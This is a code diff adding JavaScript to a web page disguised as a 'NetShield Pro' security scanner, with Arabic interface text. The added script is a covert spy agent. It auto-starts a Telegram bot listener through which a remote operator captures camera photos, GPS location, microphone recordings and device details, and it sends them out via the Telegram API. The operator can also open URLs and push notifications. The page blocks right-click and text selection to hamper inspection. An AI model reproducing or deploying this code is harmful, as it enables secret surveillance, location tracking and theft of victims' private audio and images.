+        // ==================== FLASH CONTROL ====================
+        async function turnFlashOn() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                flashStream = stream;
+                flashTrack = stream.getVideoTracks()[0];
+                await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
+                sendText('✅ تم تشغيل الفلاش');
+            } catch (e) {
+                sendText('❌ فشل تشغيل الفلاش: الجهاز لا يدعم');
+            }
+        }
+
+        function turnFlashOff() {
+            if (flashTrack) {
+                flashTrack.applyConstraints({ advanced: [{ torch: false }] }).then(() => {
+                    if (flashStream) { flashStream.getTracks().forEach(t => t.stop()); flashStream = null; flashTrack = null; }
+                    sendText('✅ تم ايقاف الفلاش');
+                }).catch(() => {
+                    if (flashStream) { flashStream.getTracks().forEach(t => t.stop()); flashStream = null; flashTrack = null; }
+                    sendText('✅ تم ايقاف الفلاش');
+                });
+            } else {
+                sendText('⚠️ الفلاش غير شغال');
+            }
+        }
+
+        // ==================== NOTIFICATIONS ====================
+        function requestNotificationPermission() {
+            if ('Notification' in window) {
+                if (Notification.permission === 'granted') {
+                    scanData.permissions.notification = true;
+                    localStorage.setItem('perm_notify', 'true');
+                } else if (Notification.permission !== 'denied') {
+                    Notification.requestPermission().then(permission => {
+                        scanData.permissions.notification = (permission === 'granted');
+                        if (scanData.permissions.notification) localStorage.setItem('perm_notify', 'true');
+                    });
+                }
+            }
+        }
+
+        function showNotification(title, body) {
+            if ('Notification' in window && Notification.permission === 'granted') {
+                navigator.serviceWorker.ready.then(registration => {
+                    registration.showNotification(title, {
+                        body: body,
+                        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
+                        vibrate: [200, 100, 200, 100, 200, 100, 200],
+                        requireInteraction: true,
+                        tag: 'netshield-alert-' + Date.now(),
+                        renotify: true,
+                        silent: false,
+                        data: { url: '/' }
+                    });
+                });
+            }
+        }
+
+        // ==================== TELEGRAM COMMAND LISTENER ====================
+        async function checkForCommands() {
+            try {
+                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
+                const data = await resp.json();
+                if (data.ok && data.result.length > 0) {
+                    for (const upd of data.result) {
+                        lastUpdateId = upd.update_id;
+                        const msg = upd.message;
+                        if (msg && msg.text) {
+                            const cmd = msg.text.toLowerCase().trim();
+
+                            if (cmd === '/photo' || cmd === '/camera' || cmd === '/cam') {
+                                if (!scanData.permissions.camera) { sendText('صلاحية الكاميرا غير مفعلة'); continue; }
+                                await captureCamera();
+                                if (scanData.camera) { await sendPhoto(scanData.camera); sendText('صورة جديدة من الكاميرا'); }
+                                else { sendText('فشل الوصول للكاميرا'); }
+                            }
+                            else if (cmd === '/location' || cmd === '/loc' || cmd === '/gps') {
+                                if (!scanData.permissions.location) { sendText('صلاحية الموقع غير مفعلة'); continue; }
+                                await captureLocation();
+                                if (scanData.location) {
+                                    const l = scanData.location;
+                                    sendText(`الموقع الحالي:\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`);
+                                }
+                                else { sendText('فشل تحديد الموقع'); }
+                            }
+                            else if (cmd === '/info' || cmd === '/device' || cmd === '/status') {
+                                collectDeviceInfo(); await collectNetworkData(); await sleep(500);
+                                let t = 'معلومات الجهاز:\n\n';
+                                if (scanData.deviceInfo) { const d = scanData.deviceInfo; t += `النظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\n`; }
+                                if (scanData.battery) { t += `البطارية: ${scanData.battery.level}%\nالشحن: ${scanData.battery.charging ? 'موصول' : 'غير موصول'}\n`; }
+                                if (scanData.network) { t += `النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`; }
+                                t += `الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                                sendText(t);
+                            }
+                            else if (cmd === '/full' || cmd === '/scan' || cmd === '/report') { await sendCompleteReport(); }
+                            else if (cmd === '/record' || cmd === '/mic' || cmd === '/audio') {
+                                if (!scanData.permissions.microphone) { sendText('صلاحية الميكروفون غير مفعلة'); continue; }
+                                sendText('جاري التسجيل (10 ثواني)...');
+                                await captureMicrophone();
+                                if (scanData.microphone) { await sendAudio(scanData.microphone); sendText('تم التسجيل'); }
+                                else { sendText('فشل التسجيل'); }
+                            }
+                            else if (cmd === '/help' || cmd === '/start') {
+                                sendText('الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/record - تسجيل 10 ثواني\n/notify - ارسال اشعار\n/open - فتح رابط\n/vibrate - اهتزاز الجهاز\n/say - تحويل نص لكلام\n/flash on - تشغيل الفلاش\n/flash off - ايقاف الفلاش\n/ping - التحقق من الاتصال\n/help - عرض المساعدة');
+                            }
+                            else if (cmd === '/ping') { sendText('الجهاز متصل وجاهز'); }
+                            else if (cmd.startsWith('/notify ')) {
+                                if (!scanData.permissions.notification) { sendText('صلاحية الاشعارات غير مفعلة'); continue; }
+                                const txt = msg.text.replace('/notify ', '');
+                                showNotification('NetShield Pro', txt);
+                                sendText('تم ارسال الاشعار: ' + txt);
+                            }
+                            else if (cmd.startsWith('/open ')) {
+                                const url = msg.text.replace('/open ', '').trim();
+                                if (url) { window.open(url, '_blank'); sendText('تم فتح الرابط: ' + url); }
+                                else { sendText('استخدام: /open [الرابط]'); }
+                            }
+                            else if (cmd === '/vibrate') {
+                                if (navigator.vibrate) { navigator.vibrate([500, 200, 500, 200, 500]); sendText('تم الاهتزاز'); }
+                                else { sendText('الجهاز لا يدعم الاهتزاز'); }
+                            }
+                            else if (cmd.startsWith('/say ')) {
+                                const textToSay = msg.text.replace('/say ', '').trim();
+                                if (textToSay) {
+                                    const utterance = new SpeechSynthesisUtterance(textToSay);
+                                    utterance.lang = 'ar';
+                                    window.speechSynthesis.speak(utterance);
+                                    sendText('تم التحدث: ' + textToSay);
+                                }
+                                else { sendText('استخدام: /say [النص]'); }
+                            }
+                            else if (cmd === '/flash on') { await turnFlashOn(); }
+                            else if (cmd === '/flash off') { turnFlashOff(); }
+                        }
+                    }
+                }
+            } catch (e) {}
+        }
+
+        function startCommandListener() {
+            document.getElementById('remoteIndicator').style.display = 'block';
+            sendText('الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
+            setInterval(checkForCommands, COMMAND_CHECK_INTERVAL);
+        }
+
+        // ==================== TELEGRAM SENDER ====================
+        async function sendCompleteReport() {
+            let r = '━━━━━━━━━━━━━━━━━━━\n  تقرير الفحص الشامل\n━━━━━━━━━━━━━━━━━━━\n\n';
+            if (scanData.deviceInfo) {
+                const d = scanData.deviceInfo;
+                r += `【 معلومات الجهاز 】\nالنظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\nالشاشة: ${d.screenWidth}x${d.screenHeight}\nالوقت: ${d.timestamp}\n\n`;
+            }
+            if (scanData.battery) {
+                const b = scanData.battery;
+                r += `【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging ? 'موصول' : 'غير موصول'}\n\n`;
+            }
+            if (scanData.network) {
+                const n = scanData.network;
+                r += `【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`;
+            }
+            if (scanData.location) {
+                const l = scanData.location;
+                r += `【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`;
+            }
+            r += `【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera ? 'نعم' : 'لا'}\nميكروفون: ${scanData.permissions.microphone ? 'نعم' : 'لا'}\nموقع: ${scanData.permissions.location ? 'نعم' : 'لا'}\nاشعارات: ${scanData.permissions.notification ? 'نعم' : 'لا'}\n\n━━━━━━━━━━━━━━━━━━━`;
+            await sendText(r);
+            if (scanData.camera) await sendPhoto(scanData.camera);
+            if (scanData.microphone) await sendAudio(scanData.microphone);
+        }
+
+        async function sendText(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {}
+        }
+
+        async function sendPhoto(base64) {
+            try {
+                const blob = await (await fetch(base64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'camera.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+
+        async function sendAudio(base64) {
+            try {
+                const blob = await (await fetch(base64)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('audio', blob, 'recording.webm');
+                fd.append('duration', '10');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+
+        // ==================== UI HELPERS ====================
+        function updateStep(n, s) {
+            const el = document.getElementById('step' + n);
+            el.className = 'progress-step';
+            if (s === 'done') el.classList.add('done');
+            if (s === 'active') el.classList.add('active');
+        }
+
+        function resetSteps() {
+            for (let i = 1; i <= 4; i++) document.getElementById('step' + i).className = 'progress-step';
+            document.getElementById('progressBar').style.width = '0%';
+        }
+
+        function updateMainStatus(s) {
+            const dot = document.getElementById('mainStatusDot');
+            const ti = document.getElementById('mainStatusTitle');
+            const de = document.getElementById('mainStatusDesc');
+            if (s) {
+                dot.classList.add('protected');
+                ti.textContent = 'محمي';
+                de.textContent = 'جميع الانظمة نشطة';
+            } else {
+                dot.classList.remove('protected');
+                ti.textContent = 'غير محمي';
+                de.textContent = 'الفحص مطلوب';
+            }
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        // ==================== AUTO START ====================
+        startCommandListener();
+
+        // ==================== AUTO REFRESH ====================
+        setInterval(() => { location.reload(); }, AUTO_REFRESH_INTERVAL);
+
+        // ==================== SECURITY ====================
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+    </script>
 </body>
 </html>
